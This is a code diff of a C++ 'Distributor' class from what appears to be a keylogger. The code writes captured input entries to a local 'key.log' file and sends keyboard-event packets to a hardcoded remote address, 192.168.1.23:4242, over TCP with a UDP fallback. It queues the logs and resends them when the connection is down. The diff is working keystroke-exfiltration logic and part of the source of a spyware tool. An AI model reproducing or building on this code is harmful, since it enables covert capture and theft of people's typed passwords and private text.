@@ -1,25 +1,34 @@
 #include "Distributor.h"
 
-Distributor::Distributor()
+Distributor::Distributor(void)
+	//: _client("192.168.1.23", "4242")
 {
 }
 
-Distributor::~Distributor()
+Distributor::~Distributor(void)
 {
 }
 
 void Distributor::init(void)
 {
-	_client.connect("192.168.1.23", "4242");
+	try {
+		_client = new TCPClient("192.168.1.23", "4242");
+	}
+	catch (std::exception const& e) {
+		(void)e;
+		_client = new UDPClient("192.168.1.23", "4242");
+	}
+
+	_client->connect();
 	//_client.connect("10.101.54.75", "4242");
-	_client.run();
+	_client->run();
 
 	_log.open(StaticTools::GetProjectResourceDirectory() + "\\key.log");
 }
 
 void Distributor::destroy(void)
 {
-	_client.disconnect();
+	_client->disconnect();
 }
 
 IDistributor &Distributor::operator<<(AInputType &entry)
@@ -27,11 +36,11 @@ IDistributor &Distributor::operator<<(AInputType &entry)
 	entry.format(_log.getSize());
 
 	entry >> _log;
-	if (_client.isConnected()) {
+	if (_client->isConnected()) {
 		if (_tosend.getSize() > 0) {
 			sendToSend();
 		}
-		entry >> _client;
+		entry >> *_client;
 	}
 	else {
 		if (!_tosend.isOpen()) {
@@ -51,7 +60,7 @@ void Distributor::sendToSend(void)
 
 	if (ifs) {
 		while (std::getline(ifs, line)) {
-			_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
+			*_client << StaticTools::CreatePacket(PacketType::PT_KeyboardEvent, line + '\n');
 		}
 		ifs.close();
 	}
